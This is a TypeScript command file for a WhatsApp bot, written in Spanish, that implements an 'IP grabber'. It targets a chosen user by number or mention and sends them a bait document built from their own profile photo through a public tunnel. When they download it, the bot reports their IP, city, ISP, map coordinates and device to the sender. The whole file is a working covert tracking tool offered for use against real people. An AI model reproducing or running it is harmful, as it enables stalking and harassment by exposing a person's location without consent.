import { randomBytes } from "node:crypto";
import { readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import {
  buildDocumentMessage,
  closeSession,
  createSession,
  ensurePublicBase,
  hasActiveSession,
  selfTest,
  sessionUrl,
  TRAP_TTL_MS,
  type TrapHit,
  type TrapSession,
} from "../../core/ipTrap.ts";

const PLACEHOLDER = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
const FALLBACKS = ["assets/img/whoisip.jpg", "assets/img/default.jpg", "assets/img/bot.jpg"];

const flagOf = (cc?: string) => (cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️");

function deviceOf(ua: string) {
  if (/android/i.test(ua)) return "📱 Android";
  if (/iphone|ipad|ipod|ios/i.test(ua)) return "🍎 iOS";
  if (/windows/i.test(ua)) return "🖥️ Windows";
  if (/mac os|macintosh/i.test(ua)) return "🖥️ macOS";
  if (/linux/i.test(ua)) return "🐧 Linux";
  return "❔ Desconocido";
}

async function sendReport(sock: any, s: TrapSession, hit: TrapHit) {
  const g = hit.geo;
  const n = s.hits.filter((h) => !h.self).length;
  let localTime = "N/D";
  if (g?.tz) {
    try {
      localTime = new Intl.DateTimeFormat("es-CO", { timeZone: g.tz, dateStyle: "short", timeStyle: "medium" }).format(new Date(hit.at));
    } catch {}
  }
  const tipo = g?.proxy ? "🛡️ Proxy / VPN" : g?.mobile ? "📶 Red móvil" : g?.hosting ? "🖧 Hosting" : "🌐 Red fija / otra";

  const lines = [
    n === 1 ? `📡 *${fytBold("IP CAPTURADA")}*` : `📡 *${fytBold(`IP ADICIONAL #${n}`)}*`,
    ``,
    `╭─〔 🎯 *OBJETIVO* 〕`,
    `┃ 👤 *Nombre:* ${s.pushName}`,
    `┃ 📱 *Número:* \`+${s.targetPhone}\``,
    `┃ 🔗 *JID:* \`${s.targetJid}\``,
    `╰─────────────────────`,
    ``,
    `╭─〔 🛰️ *CONEXIÓN* 〕`,
    `┃ 🌐 *IP:* \`${hit.ip}\``,
    `┃ ${g?.countryCode ? `🏳️ *País:* ${flagOf(g.countryCode)} ${g.country ?? "?"}` : "🏳️ *País:* Desconocido"}`,
    `┃ 🗺️ *Región:* ${g?.region ?? "N/D"}`,
    `┃ 🏙️ *Ciudad:* ${g?.city ?? "N/D"}`,
    `┃ 📶 *Tipo:* ${tipo}`,
    `┃ 🏢 *ISP:* ${g?.isp ?? "N/D"}`,
    `┃ 🏛️ *Org:* ${g?.org ?? "N/D"}`,
    `┃ 🔢 *ASN:* ${g?.asn ?? "N/D"}`,
    `┃ 🕒 *TZ:* \`${g?.tz ?? "N/D"}\``,
    `┃ ⌚ *Hora local:* ${localTime}`,
    ...(g?.lat && g?.lon ? [`┃ 📍 *Mapa:* https://www.google.com/maps?q=${g.lat},${g.lon}`] : []),
    `╰─────────────────────`,
    ``,
    `╭─〔 🧾 *CLIENTE* 〕`,
    `┃ 🖥️ *Dispositivo:* ${deviceOf(hit.ua)}`,
    `┃ 🏷️ *UA:* ${hit.ua.slice(0, 150)}`,
    `┃ 🕐 *Capturado:* ${new Date(hit.at).toLocaleString("es-CO")}`,
    `╰─────────────────────`,
    ``,
    g?.proxy || g?.hosting
      ? `⚠️ IP de proxy/VPN o datacenter: la ubicación puede no ser la real.`
      : g?.mobile
        ? `ℹ️ IP de operador móvil: ciudad aproximada por NAT del carrier.`
        : `ℹ️ Geolocalización a nivel de ciudad por base de datos de IP.`,
  ];

  await sock.sendMessage(s.chatJid, { text: lines.join("\n") }).catch(() => undefined);
}

export default {
  name: ["whoisip", "ipgrab", "rastrearip"],
  category: "group",
  description: "Captura la IP del objetivo con un documento trampa y reporta su geolocalización.",
  groupOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, msg, args, sock, from, groupMeta } = ctx;
    const log = (t: string) => console.log(`[whoisIP] ${t}`);

    let diag: any = null;
    try {
      // PASO 0: prueba de vida inmediata
      await react("🧪").catch(() => undefined);
      diag = await sock.sendMessage(from, { text: "🧪 *whoisIP v4* cargado, arrancando…" }).catch(() => null);
      log("v4 arrancado");

      const sub = (args[0] ?? "").toLowerCase().replace(/\D/g, "");
      const modo = /^ping$/.test((args[0] ?? "").toLowerCase())
        ? "ping"
        : /^test$/.test((args[0] ?? "").toLowerCase())
          ? "test"
          : "run";

      if (modo === "ping") {
        return reply("🟢 vivo. El archivo correcto está cargado y ejecutándose.");
      }

      if (modo === "test") {
        const base = await ensurePublicBase();
        const prueba = await fetch(`${base}/__ping`, { signal: AbortSignal.timeout(10000) })
          .then(async (r) => `${r.status} · ${(await r.text()).slice(0, 40)}`)
          .catch((e) => `error: ${e?.message}`);
        return reply(`🧪 Túnel: ${base}\nProbe: ${prueba}`);
      }

      // PASO 1: resolver objetivo
      const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
      let raw = "";
      if (contextInfo?.mentionedJid?.length) raw = contextInfo.mentionedJid[0];
      else if (contextInfo?.participant) raw = contextInfo.participant;
      else if (args.length) raw = args.join("");
      log(`raw=${raw}`);

      if (!raw) return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
      if (hasActiveSession(from)) return reply("⏳ Ya hay un *whoisIP* activo en este chat.");

      const isLid = raw.endsWith("@lid");
      let digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
      let targetJid = isLid ? `${digits}@lid` : `${digits}@s.whatsapp.net`;

      const participant = groupMeta?.participants?.find((p: any) => {
        const pLid = String(p.lid ?? "").split("@")[0].split(":")[0];
        const pId = String(p.id ?? "").split("@")[0].split(":")[0];
        return pLid === digits || pId === digits;
      }) as any;

      const realPhone = participant?.phoneNumber ? String(participant.phoneNumber).replace(/\D/g, "") : !isLid ? digits : "";
      if (realPhone) {
        digits = realPhone;
        targetJid = `${realPhone}@s.whatsapp.net`;
      }
      if (!digits || digits.length < 7) return reply("⚠️ No pude resolver un número. Escríbelo: *whoisIP +573118353868*.");
      log(`target=${digits} jid=${targetJid}`);

      // PASO 2: existe en WhatsApp
      if (!isLid) {
        const check = await sock.onWhatsApp(targetJid).catch((e: any) => {
          log(`onWhatsApp error: ${e?.message}`);
          return null;
        });
        log(`onWhatsApp=${JSON.stringify(check)}`);
        if (!check?.[0]?.exists) return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
      }

      // PASO 3: imagen
      const pushName = participant?.name || participant?.notify || (contextInfo?.participant === targetJid ? msg.pushName : null) || `+${digits}`;
      let plain: Buffer | null = null;
      try {
        const pp = await sock.profilePictureUrl(targetJid, "image");
        log(`pp=${pp ? "si" : "no"}`);
        if (pp) {
          const r = await fetch(pp, { signal: AbortSignal.timeout(9000) });
          if (r.ok) plain = Buffer.from(await r.arrayBuffer());
        }
      } catch (e: any) {
        log(`pp error: ${e?.message}`);
      }
      if (!plain) {
        const local = FALLBACKS.find((p) => existsSync(p));
        if (local) {
          try {
            plain = await readFile(local);
            log(`fallback ${local}`);
          } catch {}
        }
      }
      if (!plain) {
        try {
          const r = await fetch(
            `https://ui-avatars.com/api/?name=${encodeURIComponent(pushName)}&size=640&format=jpg&background=0f172a&color=ffffff`,
            { signal: AbortSignal.timeout(9000) }
          );
          if (r.ok) plain = Buffer.from(await r.arrayBuffer());
        } catch {}
      }
      if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
      log(`imagen ${plain.length}b`);

      // PASO 4: túnel
      const base = await ensurePublicBase().catch((e: any) => {
        log(`tunel error: ${e?.message}`);
        return null;
      });
      if (!base) {
        await react("❌").catch(() => undefined);
        return reply(
          `❌ *Sin túnel público*\n\n` +
          `El hosting no dejó abrir localtunnel ni tunnelmole.\n\n` +
          `En la consola: \`npm i localtunnel tunnelmole\` y reinicia.\n` +
          `O define \`TRAP_BASE_URL\` con un dominio propio.`
        );
      }
      log(`base=${base}`);

      // PASO 5: sesión + autotest
      const session = await createSession({
        plain,
        fileName: `foto_${digits.slice(-4)}.jpg`,
        targetJid,
        targetPhone: digits,
        chatJid: from,
        pushName: String(pushName),
        onHit: (s, hit) => sendReport(sock, s, hit),
        onExpire: async (s) => {
          await sock
            .sendMessage(s.chatJid, {
              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
            })
            .catch(() => undefined);
        },
      });

      const test = await selfTest(session);
      log(`selftest=${JSON.stringify(test)}`);
      if (!test.ok) {
        closeSession(session);
        await react("❌").catch(() => undefined);
        return reply(`❌ El túnel no sirve el archivo: *${test.reason}*\n${sessionUrl(session)}`);
      }

      // PASO 6: envío
      const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
      const docMsg = buildDocumentMessage(
        session,
        `🔎 *${fytBold("Análisis de red")}*\n\nToca *Descargar* para generar el reporte.\n\`+${digits}\``,
        { stanzaId: msg.key.id, participant: msg.key.participant ?? msg.key.remoteJid ?? undefined, remoteJid: from }
      );

      log(`relayMessage=${typeof (sock as any).relayMessage}`);
      if (typeof (sock as any).relayMessage !== "function") {
        return reply("❌ `sock.relayMessage` no existe en esta versión de Baileys.");
      }

      await (sock as any).relayMessage(from, docMsg, { messageId });
      log("relay OK");

      await react("📡").catch(() => undefined);
      if (diag?.key?.id) {
        await sock.sendMessage(from, { text: "✅ documento enviado (si no lo ves, el servidor lo descartó)" }, { quoted: diag }).catch(() => undefined);
      }
    } catch (e: any) {
      log(`ERROR ${e?.stack ?? e}`);
      await react("❌").catch(() => undefined);
      await reply(`❌ *whoisIP* explotó:\n\`${String(e?.stack ?? e?.message ?? e).slice(0, 400)}\``).catch(() => undefined);
    }
  },
};
